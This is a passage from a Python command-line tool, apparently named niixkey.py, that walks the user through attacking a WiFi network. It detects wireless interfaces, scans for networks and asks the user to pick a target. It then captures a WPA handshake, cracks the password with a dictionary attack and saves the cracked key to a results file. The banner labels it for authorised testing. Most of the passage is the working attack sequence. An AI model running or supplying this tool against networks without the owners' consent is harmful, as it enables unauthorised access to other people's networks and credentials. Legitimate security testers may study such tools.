            subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
                           capture_output=True, timeout=10)
            MONITOR_IFACE = None
        except Exception:
            pass

    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        if result.returncode == 0:
            iface = None
            in_iface = False
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface'):
                    iface = line.split()[1]
                    in_iface = True
                elif in_iface and 'type monitor' in line and iface:
                    subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
                                   capture_output=True, timeout=5)
                    in_iface = False
                elif line == '':
                    in_iface = False
    except Exception:
        pass

    restart_network_manager()
    ok("Cleanup complete — network restored")


def show_banner():
    """Show colourful tool banner."""
    # Gradient: cyan → blue → magenta across rows
    colours = [C.BCYAN, C.BCYAN, C.BBLUE, C.BBLUE, C.BMAGENTA, C.BMAGENTA]
    rows = [
        r"    ███╗   ██╗██╗██╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗",
        r"    ████╗  ██║██║██║╚██╗██╔╝    ██║    ██║██║██╔════╝██║",
        r"    ██╔██╗ ██║██║██║ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║",
        r"    ██║╚██╗██║██║██║ ██╔██╗     ██║███╗██║██║██╔══╝  ██║",
        r"    ██║ ╚████║██║██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║",
        r"    ╚═╝  ╚═══╝╚═╝╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝",
    ]
    print()
    for row, col in zip(rows, colours):
        print(c(row, col, C.BOLD))
    print()
    sub  = c("  Universal WiFi Security Testing Tool", C.BWHITE, C.BOLD)
    ver  = c("v2.0", C.BYELLOW, C.BOLD)
    print(f"{sub}  {ver}")
    print(c("  Arch Linux  │  Debian / Ubuntu / Kali  │  Fedora / RHEL", C.DIM))
    print(c("  For Authorized Testing and Educational Use Only", C.BRED, C.DIM))
    print()


def main():
    """Main entry point."""
    os.system('clear')
    show_banner()

    # Require root
    if os.geteuid() != 0:
        err("This tool requires root privileges!")
        info("Run:  sudo python3 niixkey.py")
        sys.exit(1)

    # Check OS
    os_name = get_os()
    info(f"Operating System:  {c(os_name, C.BWHITE, C.BOLD)}")

    if "Unknown" in os_name:
        err("This tool only supports Linux")
        sys.exit(1)

    # ── Dependencies ──────────────────────────────────────
    section("System Check")
    info("Checking dependencies…")
    if not check_all_dependencies():
        warn("Some dependencies are missing — installing now…")
        if not install_dependencies():
            warn("Some dependencies could not be installed")
            resp = ask("Continue anyway? [y/N]")
            if resp.strip().lower() != 'y':
                cleanup()
                sys.exit(1)
    ok("All dependencies satisfied")

    # ── Wireless interfaces ───────────────────────────────
    section("Interface Selection")
    info("Detecting wireless interfaces…")
    interfaces = get_wireless_interfaces()

    if not interfaces:
        err("No wireless interfaces found!")
        warn("Make sure a monitor-capable adapter is connected")
        info(c("Compatible chipsets: AR9271 · RT3070 · RT3572 · MT7601U", C.DIM))
        cleanup()
        sys.exit(1)

    ok(f"Found:  {c(', '.join(interfaces), C.BWHITE, C.BOLD)}")

    if len(interfaces) > 1:
        print()
        for i, iface in enumerate(interfaces, 1):
            print(f"    {c(str(i), C.BYELLOW, C.BOLD)}.  {c(iface, C.BWHITE)}")
        print()
        while True:
            try:
                raw = ask(f"Select interface (1–{len(interfaces)}):")
                choice = int(raw.strip())
                if 1 <= choice <= len(interfaces):
                    interface = interfaces[choice - 1]
                    break
                warn(f"Enter a number between 1 and {len(interfaces)}")
            except ValueError:
                warn("Invalid input")
    else:
        interface = interfaces[0]
        info(f"Using interface:  {c(interface, C.BWHITE, C.BOLD)}")

    # ── Network scan ──────────────────────────────────────
    section("Network Scan")
    networks = scan_networks(interface)

    if not networks:
        err("No networks found during scan")
        warn("Check that your adapter supports monitor mode")
        info(c("Try:  iw list | grep -A 10 'Supported interface modes'", C.DIM))
        cleanup()
        sys.exit(1)

    ok(f"Discovered  {c(str(len(networks)), C.BYELLOW, C.BOLD)}  network(s)")

    # ── Target selection ──────────────────────────────────
    network_idx = display_networks_menu(networks)
    if network_idx == -1:
        info("Cancelled by user")
        cleanup()
        sys.exit(0)

    selected = networks[network_idx]

    # ── Confirmation card ─────────────────────────────────
    section("Selected Target")
    divider()
    print(f"  {c('SSID   ', C.DIM)}  {c(selected.ssid, C.BWHITE, C.BOLD)}")
    print(f"  {c('BSSID  ', C.DIM)}  {c(selected.bssid, C.BCYAN)}")
    print(f"  {c('Channel', C.DIM)}  {c(str(selected.channel), C.BYELLOW)}")
    print(f"  {c('Signal ', C.DIM)}  {c(str(selected.signal) + ' dBm', C.BGREEN if selected.signal > -70 else C.BYELLOW)}")
    divider()
    print()

    resp = ask("Proceed with this target? [y/N]")
    if resp.strip().lower() != 'y':
        info("Cancelled")
        cleanup()
        sys.exit(0)

    if not selected.channel:
        selected = selected._replace(channel=1)
        warn("Channel unknown — defaulting to ch 1")

    # ── Handshake capture ─────────────────────────────────
    section("Handshake Capture")
    capture_file = capture_handshake(
        interface, selected.bssid, selected.channel, selected.ssid
    )

    if not capture_file:
        err("Handshake capture failed or was cancelled")
        cleanup()
        sys.exit(1)

    # ── Password cracking ─────────────────────────────────
    section("Dictionary Attack")
    password = crack_wpa_password(capture_file, selected.bssid)

    # ── Save & finish ─────────────────────────────────────
    if password:
        results_file = 'cracked_results.txt'
        timestamp    = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(results_file, 'a') as f:
            f.write(f"{'─' * 60}\n")
            f.write(f"Date:     {timestamp}\n")
            f.write(f"SSID:     {selected.ssid}\n")
            f.write(f"BSSID:    {selected.bssid}\n")
            f.write(f"Password: {password}\n")
            f.write(f"{'─' * 60}\n\n")
        ok(f"Results saved →  {c(results_file, C.BWHITE)}")
    else:
        section("No Password Found")
        warn("The password was not in the wordlist")
        info("Suggestions:")
        print(f"    {c('1.', C.BYELLOW)} Use rockyou.txt or a larger wordlist")
        print(f"    {c('2.', C.BYELLOW)} Try hashcat with rule-based mutation")
        print(f"    {c('3.', C.BYELLOW)} The network may use a strong random key")

    cleanup()
    section("Session Complete")
    ok(f"Done  ·  {c(time.strftime('%H:%M:%S'), C.DIM)}")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user")
        cleanup()
        sys.exit(0)
    except Exception as e:
        err(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        cleanup()
        sys.exit(1)
